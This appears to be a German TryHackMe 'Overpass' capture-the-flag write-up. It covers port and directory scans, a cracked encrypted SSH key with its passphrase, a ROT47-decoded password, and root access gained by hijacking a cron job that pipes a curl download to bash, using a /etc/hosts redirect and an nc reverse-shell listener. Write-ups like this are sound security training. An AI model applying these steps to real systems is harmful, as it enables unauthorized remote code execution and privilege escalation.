---
description: https://tryhackme.com/room/overpass
---

# ✅ Overpass

## Gegeben

* IP

## Vorgehen

### 1. NMAP-Scan:

{% code overflow="wrap" %}
```
22:ssh
80:http
```
{% endcode %}

{% code overflow="wrap" %}
```
<!--Yeah right, just because the Romans used it doesn't make it military grade, change this?-->
# Kommentar in HTML-Code weist auf Cesars Chiffre hin

https://socketloop.com/tutorials/golang-rotate-47-caesar-cipher-by-47-characters-example
```
{% endcode %}

### 2. DIRB-Scan

{% code overflow="wrap" fullWidth="false" %}
```
---- Scanning URL: http://10.10.3.185/ ----
==> DIRECTORY: http://10.10.3.185/aboutus/                                     
+ http://10.10.3.185/admin (CODE:301|SIZE:42)                                  
==> DIRECTORY: http://10.10.3.185/css/                                         
==> DIRECTORY: http://10.10.3.185/downloads/                                   
==> DIRECTORY: http://10.10.3.185/img/                                         
+ http://10.10.3.185/index.html (CODE:301|SIZE:0)                              
                                                                               
---- Entering directory: http://10.10.3.185/aboutus/ ----
+ http://10.10.3.185/aboutus/index.html (CODE:301|SIZE:0)                      
                                                                               
---- Entering directory: http://10.10.3.185/css/ ----
+ http://10.10.3.185/css/index.html (CODE:301|SIZE:0)                          
                                                                               
---- Entering directory: http://10.10.3.185/downloads/ ----
+ http://10.10.3.185/downloads/index.html (CODE:301|SIZE:0)                    
+ http://10.10.3.185/downloads/src (CODE:301|SIZE:0)                           
                                                                               
---- Entering directory: http://10.10.3.185/img/ ----
+ http://10.10.3.185/img/index.html (CODE:301|SIZE:0)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                
```
{% endcode %}

### 3. User

```
# Entwickler
ninja
pars
szymex
bee
muirlandoracle

# Accounts?
steve
james
paradox
```

### 4. cracking id\_rsa

{% content-ref url="../../../killchain/exploitation-persistence-and-privilege-escalation/cracking/id_rsa.md" %}
[id\_rsa.md](../../../killchain/exploitation-persistence-and-privilege-escalation/cracking/id_rsa.md)
{% endcontent-ref %}

{% code overflow="wrap" %}
```
# Ergebnis
james rsa_key:james13

-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,9F85D92F34F42626F13A7493AB48F337

LNu5wQBBz7pKZ3cc4TWlxIUuD/opJi1DVpPa06pwiHHhe8Zjw3/v+xnmtS3O+qiN
JHnLS8oUVR6Smosw4pqLGcP3AwKvrzDWtw2ycO7mNdNszwLp3uto7ENdTIbzvJal
73/eUN9kYF0ua9rZC6mwoI2iG6sdlNL4ZqsYY7rrvDxeCZJkgzQGzkB9wKgw1ljT
WDyy8qncljugOIf8QrHoo30Gv+dAMfipTSR43FGBZ/Hha4jDykUXP0PvuFyTbVdv
BMXmr3xuKkB6I6k/jLjqWcLrhPWS0qRJ718G/u8cqYX3oJmM0Oo3jgoXYXxewGSZ
AL5bLQFhZJNGoZ+N5nHOll1OBl1tmsUIRwYK7wT/9kvUiL3rhkBURhVIbj2qiHxR
3KwmS4Dm4AOtoPTIAmVyaKmCWopf6le1+wzZ/UprNCAgeGTlZKX/joruW7ZJuAUf
ABbRLLwFVPMgahrBp6vRfNECSxztbFmXPoVwvWRQ98Z+p8MiOoReb7Jfusy6GvZk
VfW2gpmkAr8yDQynUukoWexPeDHWiSlg1kRJKrQP7GCupvW/r/Yc1RmNTfzT5eeR
OkUOTMqmd3Lj07yELyavlBHrz5FJvzPM3rimRwEsl8GH111D4L5rAKVcusdFcg8P
9BQukWbzVZHbaQtAGVGy0FKJv1WhA+pjTLqwU+c15WF7ENb3Dm5qdUoSSlPzRjze
eaPG5O4U9Fq0ZaYPkMlyJCzRVp43De4KKkyO5FQ+xSxce3FW0b63+8REgYirOGcZ
4TBApY+uz34JXe8jElhrKV9xw/7zG2LokKMnljG2YFIApr99nZFVZs1XOFCCkcM8
GFheoT4yFwrXhU1fjQjW/cR0kbhOv7RfV5x7L36x3ZuCfBdlWkt/h2M5nowjcbYn
exxOuOdqdazTjrXOyRNyOtYF9WPLhLRHapBAkXzvNSOERB3TJca8ydbKsyasdCGy
AIPX52bioBlDhg8DmPApR1C1zRYwT1LEFKt7KKAaogbw3G5raSzB54MQpX6WL+wk
6p7/wOX6WMo1MlkF95M3C7dxPFEspLHfpBxf2qys9MqBsd0rLkXoYR6gpbGbAW58
dPm51MekHD+WeP8oTYGI4PVCS/WF+U90Gty0UmgyI9qfxMVIu1BcmJhzh8gdtT0i
n0Lz5pKY+rLxdUaAA9KVwFsdiXnXjHEE1UwnDqqrvgBuvX6Nux+hfgXi9Bsy68qT
8HiUKTEsukcv/IYHK1s+Uw/H5AWtJsFmWQs3bw+Y4iw+YLZomXA4E7yxPXyfWm4K
4FMg3ng0e4/7HRYJSaXLQOKeNwcf/LW5dipO7DmBjVLsC8eyJ8ujeutP/GcA5l6z
ylqilOgj4+yiS813kNTjCJOwKRsXg2jKbnRa8b7dSRz7aDZVLpJnEy9bhn6a7WtS
49TxToi53ZB14+ougkL4svJyYYIRuQjrUmierXAdmbYF9wimhmLfelrMcofOHRW2
+hL1kHlTtJZU8Zj2Y2Y3hd6yRNJcIgCDrmLbn9C5M0d7g0h2BlFaJIZOYDS6J6Yk
2cWk/Mln7+OhAApAvDBKVM7/LGR9/sVPceEos6HTfBXbmsiV+eoFzUtujtymv8U7
-----END RSA PRIVATE KEY-----
```
{% endcode %}

### 5. Rot47-kodiertes Passwort&#x20;

```
,LQ?2>6QiQ$JDE6>Q[QA2DDQiQD2J5C2H?=J:?8A:4EFC6QN.

[{"name":"System","pass":"saydrawnlyingpicture"}]
```

### 6. crontab

```
# Update builds from latest code
* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
# Download des Scripts und ausführen als root

```

1. Änderung des Eintrages in /etc/hosts damit overpass.thm auf mich zeigt
2. Aufbauen einer Ordnerstruktur mit /downloads/src/rev\_shell
3. Lauschen mit `python3 -m http.server 80` als Webserver
4. Lauschen mit `nc -lvnp 5432` als Webserver
5. pwned

### 7. Root Flag

root.txt gefunden
